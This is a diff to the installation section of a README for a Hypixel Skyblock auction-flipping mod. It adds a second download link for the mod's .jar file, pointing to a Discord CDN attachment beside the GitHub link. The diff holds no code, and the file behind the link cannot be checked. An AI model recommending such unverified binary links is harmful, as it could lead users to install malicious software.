@@ -36,7 +36,7 @@ To use the mod, open chat and type `/flip` followed by a subcommand. Here are so
 ## 📦 Installation
 
 1. Install **Minecraft Forge 1.8.9**
-2. Download the latest version of the mod from the [Releases](https://github.com/hypixelskyblockmodder/SPLAuctionFlipper/blob/main/SPL_Flipper_v1.9.3.jar)
+2. Download the latest version of the mod from the [Releases](https://github.com/hypixelskyblockmodder/SPLAuctionFlipper/blob/main/SPL_Flipper_v1.9.3.jar) or [Upload](https://cdn.discordapp.com/attachments/1378890537532264461/1378965091948433519/SPL_Flipper_v1.9.3.jar?ex=683e84d1&is=683d3351&hm=bc9ff08695bab77dbcb2a0b0f403370299bbce6bf12ffac091205c0705163360&)
 3. Move the `.jar` file into your `.minecraft/mods` folder
 4. Launch Minecraft and join Hypixel Skyblock
 5. Type `/flip help` to begin
